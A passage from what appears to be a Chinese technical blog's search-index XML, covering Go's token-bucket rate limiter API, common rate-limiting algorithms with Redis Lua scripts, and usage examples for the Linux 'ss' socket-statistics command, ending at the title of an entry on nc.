punctuation">)</span> <span class="token operator">*</span>Reservation<span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">Wait</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">(</span>err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token comment">// WaitN(ctx, 1)</span><span class="token comment">// 如果存在n个令牌就直接转发，不存在就阻塞，直至满足条件，传入的ctx的Deadline就是等待的Deadline</span><span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">WaitN</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> n <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>err <span class="token builtin">error</span><span class="token punctuation">)</span><span class="token comment">// 动态流控</span><span class="token comment">// 设置桶的大小</span><span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">SetBurst</span><span class="token punctuation">(</span>newBurst <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token comment">// 流控最后的更新时间</span><span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">SetBurstAt</span><span class="token punctuation">(</span>now time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> newBurst <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token comment">// token 生产速率</span><span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">SetLimit</span><span class="token punctuation">(</span>newLimit Limit<span class="token punctuation">)</span><span class="token comment">// 流控最后的更新时间</span><span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">SetLimitAt</span><span class="token punctuation">(</span>now time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> newLimit Limit<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 如果不想等待，可以调用Cancel()方法，该方法会将Token归还。</span><span class="token keyword">func</span> <span class="token punctuation">(</span>r <span class="token operator">*</span>Reservation<span class="token punctuation">)</span> <span class="token function">Cancel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token punctuation">(</span>r <span class="token operator">*</span>Reservation<span class="token punctuation">)</span> <span class="token function">CancelAt</span><span class="token punctuation">(</span>now time<span class="token punctuation">.</span>Time<span class="token punctuation">)</span><span class="token comment">// 返回需要等待的时间。如果等待时间为0，则说明不用等待</span><span class="token keyword">func</span> <span class="token punctuation">(</span>r <span class="token operator">*</span>Reservation<span class="token punctuation">)</span> <span class="token function">Delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> time<span class="token punctuation">.</span>Duration<span class="token keyword">func</span> <span class="token punctuation">(</span>r <span class="token operator">*</span>Reservation<span class="token punctuation">)</span> <span class="token function">DelayFrom</span><span class="token punctuation">(</span>now time<span class="token punctuation">.</span>Time<span class="token punctuation">)</span> time<span class="token punctuation">.</span>Duration<span class="token keyword">func</span> <span class="token punctuation">(</span>r <span class="token operator">*</span>Reservation<span class="token punctuation">)</span> <span class="token function">OK</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">bool</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 对ip进行限流</span><span class="token keyword">var</span> limiters <span class="token operator">=</span> <span class="token operator">&amp;</span>sync<span class="token punctuation">.</span>Map<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">rateLimiter</span><span class="token punctuation">(</span>r rate<span class="token punctuation">.</span>Limit<span class="token punctuation">,</span> b <span class="token builtin">int</span><span class="token punctuation">,</span> ip <span class="token builtin">string</span><span class="token punctuation">,</span> t time<span class="token punctuation">.</span>Duration<span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span> l<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> limiters<span class="token punctuation">.</span><span class="token function">LoadOrStore</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> rate<span class="token punctuation">.</span><span class="token function">NewLimiter</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span> ctx<span class="token punctuation">,</span> cancel <span class="token operator">:=</span> context<span class="token punctuation">.</span><span class="token function">WithTimeout</span><span class="token punctuation">(</span>context<span class="token punctuation">.</span><span class="token function">Background</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token keyword">defer</span> <span class="token function">cancel</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> err <span class="token operator">:=</span> l<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>rate<span class="token punctuation">.</span>Limiter<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">return</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>限流器</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-04-19-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-%E9%99%90%E6%B5%81%E5%99%A8/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-04-19-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-%E9%99%90%E6%B5%81%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://github.com/alibaba/Sentinel/wiki/%E7%B3%BB%E7%BB%9F%E8%87%AA%E9%80%82%E5%BA%94%E9%99%90%E6%B5%81">系统自适应限流</a></p><p><a href="https://juejin.cn/post/7075137592265539614">5种限流算法，7种限流方式，挡住突发流量</a></p><h4 id="限流"><a href="#限流" class="headerlink" title="限流"></a>限流</h4><p>通过对一个时间窗口内的请求量进行限制来保障系统的正常运行。如果我们的服务资源有限、处理能力有限，就需要对调用我们服务的上游请求进行限制，以防止自身服务由于资源耗尽而停止服务。</p><blockquote><p>阈值：在一个单位时间内允许的请求量。</p><p>拒绝策略：超过阈值的请求的拒绝策略，常见的拒绝策略有直接拒绝、排队等。</p></blockquote><h4 id="常见限流算法-静态"><a href="#常见限流算法-静态" class="headerlink" title="常见限流算法(静态)"></a>常见限流算法(静态)</h4><h5 id="1-固定窗口算法"><a href="#1-固定窗口算法" class="headerlink" title="1.固定窗口算法"></a>1.固定窗口算法</h5><p>固定窗口算法又叫计数器算法，是一种简单方便的限流算法。主要通过一个支持原子操作的计数器来累计1秒内的请求次数，当一秒内计数达到限流阈值时触发拒绝策略。每过1秒，计数器重置为0。</p><h5 id="2-滑动窗口算法"><a href="#2-滑动窗口算法" class="headerlink" title="2.滑动窗口算法"></a>2.滑动窗口算法</h5><p>滑动窗口是对固定窗口算法的改进。在一个窗口内分段，不能从根本上解决时间窗口的临界突变问题。</p><h5 id="3-滑动日志算法"><a href="#3-滑动日志算法" class="headerlink" title="3.滑动日志算法"></a>3.滑动日志算法</h5><p>记录下所有的请求时间点，新请求到来时先判断最近置顶时间范围内的请求数量是否超过指定阈值，由此来确定是否达到限流，这种方式没有了时间窗口突变的问题，限流比较准确，但是因为要记录每次请求的时间点，所以占用的内存较多。</p><h5 id="4-漏桶算法"><a href="#4-漏桶算法" class="headerlink" title="4.漏桶算法"></a>4.漏桶算法</h5><p>漏桶算法中的漏桶是一个形象的比喻，这里可以用生产者消费者模式进行说明，请求是一个生产者，每一个请求都如一滴水，请求到来后放到一个队列（漏桶）中，桶底有一个孔，不断漏出水滴，如消费者在消费队列中的内容，消费的速率（漏出的速度）等于限流阈值。漏桶的大小，就如队列的容量，当请求堆积超过指定容量时，会触发拒绝策略。</p><h5 id="5-令牌桶算法"><a href="#5-令牌桶算法" class="headerlink" title="5.令牌桶算法"></a>5.令牌桶算法</h5><p>令牌桶的实现思路类似于生产者和消费者的关系。系统服务作为生产者，按照指定频率向桶中添加令牌，如果桶中令牌数量达到阈值，则不在添加。请求执行作为消费者，每个请求都需要去桶中拿取一个令牌，取到令牌则继续执行，如果桶中无令牌可取，则触发拒绝策略，可以是超时等待，也可以直接拒绝本次请求。</p><ul><li>Todo 令牌生成算法<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 限流器结构体</span><span class="token keyword">type</span> Limiter  <span class="token comment">// 构建一个限流器，r 是每秒放入的令牌数量，b 是桶的大小</span>  <span class="token keyword">func</span> <span class="token function">NewLimiter</span><span class="token punctuation">(</span>r Limit<span class="token punctuation">,</span> b <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">*</span>Limiter  <span class="token comment">// 分别返回 b 和 r 的值</span>  <span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">Burst</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">int</span>  <span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">Limit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> Limit  <span class="token comment">// token 消费方法</span>  <span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">Allow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">bool</span>  <span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">AllowN</span><span class="token punctuation">(</span>now time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> n <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">bool</span>  <span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">Reserve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span>Reservation  <span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">ReserveN</span><span class="token punctuation">(</span>now time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> n <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">*</span>Reservation  <span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">Wait</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">(</span>err <span class="token builtin">error</span><span class="token punctuation">)</span>  <span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">WaitN</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> n <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>err <span class="token builtin">error</span><span class="token punctuation">)</span>  <span class="token comment">// 动态流控</span>  <span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">SetBurst</span><span class="token punctuation">(</span>newBurst <span class="token builtin">int</span><span class="token punctuation">)</span>  <span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">SetBurstAt</span><span class="token punctuation">(</span>now time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> newBurst <span class="token builtin">int</span><span class="token punctuation">)</span>  <span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">SetLimit</span><span class="token punctuation">(</span>newLimit Limit<span class="token punctuation">)</span>  <span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">SetLimitAt</span><span class="token punctuation">(</span>now time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> newLimit Limit<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h5 id="6-Redis分布式限流"><a href="#6-Redis分布式限流" class="headerlink" title="6.Redis分布式限流"></a>6.Redis分布式限流</h5><p>Redis单线程，内存操作，速度快</p><ol><li><p>固定窗口限流：使用incr命令实现，使用时间戳为key。使用lua保证incr和expire是原子操作。</p><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> count <span class="token operator">=</span> redis<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">"incr"</span><span class="token punctuation">,</span>KEYS<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> count <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">then</span>  redis<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">'expire'</span><span class="token punctuation">,</span>KEYS<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>ARGV<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">end</span><span class="token keyword">if</span> count <span class="token operator">></span> <span class="token function">tonumber</span><span class="token punctuation">(</span>ARGV<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">then</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">end</span><span class="token keyword">return</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>滑动窗口限流：zset有序集合实现滑动窗口。lua保证原子性。</p><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">--KEYS[1]: 限流 key</span><span class="token comment">--ARGV[1]: 时间戳 - 时间窗口</span><span class="token comment">--ARGV[2]: 当前时间戳（作为score）</span><span class="token comment">--ARGV[3]: 阈值</span><span class="token comment">--ARGV[4]: score 对应的唯一value</span><span class="token comment">-- 1. 移除时间窗口之前的数据</span>redis<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">'zremrangeByScore'</span><span class="token punctuation">,</span> KEYS<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ARGV<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">-- 2. 统计当前元素数量</span><span class="token keyword">local</span> res <span class="token operator">=</span> redis<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">'zcard'</span><span class="token punctuation">,</span> KEYS<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">-- 3. 是否超过阈值</span><span class="token keyword">if</span> <span class="token punctuation">(</span>res <span class="token operator">==</span> <span class="token keyword">nil</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>res <span class="token operator">&lt;</span> <span class="token function">tonumber</span><span class="token punctuation">(</span>ARGV<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">then</span> redis<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">'zadd'</span><span class="token punctuation">,</span> KEYS<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ARGV<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ARGV<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络-网络状态工具ss</title>
      <link href="/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E7%8A%B6%E6%80%81%E5%B7%A5%E5%85%B7ss/"/>
      <url>/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E7%8A%B6%E6%80%81%E5%B7%A5%E5%85%B7ss/</url>
      
        <content type="html"><![CDATA[<h2 id="ss"><a href="#ss" class="headerlink" title="ss"></a>ss</h2><p><strong>ss命令</strong> 用来显示处于活动状态的套接字信息。ss命令可以用来获取socket统计信息，它可以显示和netstat类似的内容。但ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ss <span class="token punctuation">[</span>参数<span class="token punctuation">]</span>ss <span class="token punctuation">[</span>参数<span class="token punctuation">]</span> <span class="token punctuation">[</span>过滤<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-h, <span class="token parameter variable">--help</span>      帮助信息-V, <span class="token parameter variable">--version</span>   程序版本信息-n, <span class="token parameter variable">--numeric</span>   不解析服务名称-r, <span class="token parameter variable">--resolve</span>   解析主机名-a, <span class="token parameter variable">--all</span>       显示所有套接字（sockets）-l, <span class="token parameter variable">--listening</span> 显示监听状态的套接字（sockets）-o, <span class="token parameter variable">--options</span>   显示计时器信息-e, <span class="token parameter variable">--extended</span>  显示详细的套接字（sockets）信息-m, <span class="token parameter variable">--memory</span>    显示套接字（socket）的内存使用情况-p, <span class="token parameter variable">--processes</span> 显示使用套接字（socket）的进程-i, <span class="token parameter variable">--info</span>      显示 TCP内部信息-s, <span class="token parameter variable">--summary</span>   显示套接字（socket）使用概况-4, <span class="token parameter variable">--ipv4</span>      仅显示IPv4的套接字（sockets）-6, <span class="token parameter variable">--ipv6</span>      仅显示IPv6的套接字（sockets）-0, <span class="token parameter variable">--packet</span>    显示 PACKET 套接字（socket）-t, <span class="token parameter variable">--tcp</span>       仅显示 TCP套接字（sockets）-u, <span class="token parameter variable">--udp</span>       仅显示 UCP套接字（sockets）-d, <span class="token parameter variable">--dccp</span>      仅显示 DCCP套接字（sockets）-w, <span class="token parameter variable">--raw</span>       仅显示 RAW套接字（sockets）-x, <span class="token parameter variable">--unix</span>      仅显示 Unix套接字（sockets）-f, <span class="token parameter variable">--family</span><span class="token operator">=</span>FAMILY  显示 FAMILY类型的套接字（sockets），FAMILY可选，支持  unix, inet, inet6, link, netlink-A, <span class="token parameter variable">--query</span><span class="token operator">=</span>QUERY, <span class="token parameter variable">--socket</span><span class="token operator">=</span>QUERY      QUERY :<span class="token operator">=</span> <span class="token punctuation">&#123;</span>all<span class="token operator">|</span>inet<span class="token operator">|</span>tcp<span class="token operator">|</span>udp<span class="token operator">|</span>raw<span class="token operator">|</span>unix<span class="token operator">|</span>packet<span class="token operator">|</span>netlink<span class="token punctuation">&#125;</span><span class="token punctuation">[</span>,QUERY<span class="token punctuation">]</span>-D, <span class="token parameter variable">--diag</span><span class="token operator">=</span>FILE     将原始TCP套接字（sockets）信息转储到文件 -F, <span class="token parameter variable">--filter</span><span class="token operator">=</span>FILE  从文件中都去过滤器信息       FILTER :<span class="token operator">=</span> <span class="token punctuation">[</span> state TCP-STATE <span class="token punctuation">]</span> <span class="token punctuation">[</span> EXPRESSION <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ss <span class="token parameter variable">-t</span> <span class="token parameter variable">-a</span>    <span class="token comment"># 显示TCP连接</span>ss <span class="token parameter variable">-s</span>       <span class="token comment"># 显示 Sockets 摘要</span>ss <span class="token parameter variable">-l</span>       <span class="token comment"># 列出所有打开的网络连接端口</span>ss <span class="token parameter variable">-pl</span>      <span class="token comment"># 查看进程使用的socket</span>ss <span class="token parameter variable">-lp</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token number">3306</span>  <span class="token comment"># 找出打开套接字/端口应用程序</span>ss <span class="token parameter variable">-u</span> <span class="token parameter variable">-a</span>    显示所有UDP Socketsss <span class="token parameter variable">-o</span> state established <span class="token string">'( dport = :smtp or sport = :smtp )'</span> <span class="token comment"># 显示所有状态为established的SMTP连接</span>ss <span class="token parameter variable">-o</span> state established <span class="token string">'( dport = :http or sport = :http )'</span> <span class="token comment"># 显示所有状态为Established的HTTP连接</span>ss <span class="token parameter variable">-o</span> state fin-wait-1 <span class="token string">'( sport = :http or sport = :https )'</span> dst <span class="token number">193.233</span>.7/24  <span class="token comment"># 列举出处于 FIN-WAIT-1状态的源端口为 80或者 443，目标网络为 193.233.7/24所有 tcp套接字</span><span class="token comment"># ss 和 netstat 效率对比</span><span class="token function">time</span> <span class="token function">netstat</span> <span class="token parameter variable">-at</span><span class="token function">time</span> ss<span class="token comment"># 匹配远程地址和端口号</span><span class="token comment"># ss dst ADDRESS_PATTERN</span>ss dst <span class="token number">192.168</span>.1.5ss dst <span class="token number">192.168</span>.119.113:httpss dst <span class="token number">192.168</span>.119.113:smtpss dst <span class="token number">192.168</span>.119.113:443<span class="token comment"># 匹配本地地址和端口号</span><span class="token comment"># ss src ADDRESS_PATTERN</span>ss src <span class="token number">192.168</span>.119.103ss src <span class="token number">192.168</span>.119.103:httpss src <span class="token number">192.168</span>.119.103:80ss src <span class="token number">192.168</span>.119.103:smtpss src <span class="token number">192.168</span>.119.103:25<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>将本地或者远程端口和一个数比较</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ss dport OP PORT 远程端口和一个数比较；</span><span class="token comment"># ss sport OP PORT 本地端口和一个数比较</span><span class="token comment"># OP 可以代表以下任意一个:</span><span class="token comment"># &lt;= or le : 小于或等于端口号</span><span class="token comment"># >= or ge : 大于或等于端口号</span><span class="token comment"># == or eq : 等于端口号</span><span class="token comment"># != or ne : 不等于端口号</span><span class="token comment"># &lt; or gt : 小于端口号</span><span class="token comment"># > or lt : 大于端口号</span>ss  sport <span class="token operator">=</span> :httpss  dport <span class="token operator">=</span> :httpss  dport <span class="token punctuation">\</span><span class="token operator">></span> :1024ss  sport <span class="token punctuation">\</span><span class="token operator">></span> :1024ss sport <span class="token punctuation">\</span><span class="token operator">&lt;</span> :32000ss  sport eq :22ss  dport <span class="token operator">!=</span> :22ss  state connected sport <span class="token operator">=</span> :httpss <span class="token punctuation">\</span><span class="token punctuation">(</span> sport <span class="token operator">=</span> :http or sport <span class="token operator">=</span> :https <span class="token punctuation">\</span><span class="token punctuation">)</span>ss <span class="token parameter variable">-o</span> state fin-wait-1 <span class="token punctuation">\</span><span class="token punctuation">(</span> sport <span class="token operator">=</span> :http or sport <span class="token operator">=</span> :https <span class="token punctuation">\</span><span class="token punctuation">)</span> dst <span class="token number">192.168</span>.1/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>用TCP 状态过滤Sockets</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ss <span class="token parameter variable">-4</span> state closing<span class="token comment"># ss -4 state FILTER-NAME-HERE</span><span class="token comment"># ss -6 state FILTER-NAME-HERE</span><span class="token comment"># FILTER-NAME-HERE 可以代表以下任何一个：</span><span class="token comment"># established、 syn-sent、 syn-recv、 fin-wait-1、 fin-wait-2、 time-wait、 closed、 close-wait、 last-ack、 listen、 closing、</span><span class="token comment"># all : 所有以上状态</span><span class="token comment"># connected : 除了listen and closed的所有状态</span><span class="token comment"># synchronized :所有已连接的状态除了syn-sent</span><span class="token comment"># bucket : 显示状态为maintained as minisockets,如：time-wait和syn-recv.</span><span class="token comment"># big : 和bucket相反.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>显示 Sockets 摘要</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># ss -s</span>Total: <span class="token number">172</span> <span class="token punctuation">(</span>kernel <span class="token number">189</span><span class="token punctuation">)</span>TCP:   <span class="token number">10</span> <span class="token punctuation">(</span>estab <span class="token number">2</span>, closed <span class="token number">4</span>, orphaned <span class="token number">0</span>, synrecv <span class="token number">0</span>, timewait <span class="token number">0</span>/0<span class="token punctuation">)</span>, ports <span class="token number">5</span>Transport Total     <span class="token function">ip</span>        IPv6*         <span class="token number">189</span>       -         -RAW       <span class="token number">0</span>         <span class="token number">0</span>         <span class="token number">0</span>UDP       <span class="token number">5</span>         <span class="token number">5</span>         <span class="token number">0</span>TCP       <span class="token number">6</span>         <span class="token number">6</span>         <span class="token number">0</span>INET      <span class="token number">11</span>        <span class="token number">11</span>        <span class="token number">0</span>FRAG      <span class="token number">0</span>         <span class="token number">0</span>         <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>列出当前的established, closed, orphaned and waiting TCP sockets</p><p><strong>查看TCP的连接状态</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># ss  -tan|awk 'NR>1&#123;++S[$1]&#125;END&#123;for (a in S) print a,S[a]&#125;'</span>LISTEN <span class="token number">7</span>ESTAB <span class="token number">31</span>TIME-WAIT <span class="token number">28</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络-抓包工具tcpdump</title>
      <link href="/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7tcpdump/"/>
      <url>/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7tcpdump/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络-网络工具nc</title>
      <link href="/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7nc/"/>
      <url>/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7nc/</url>
      
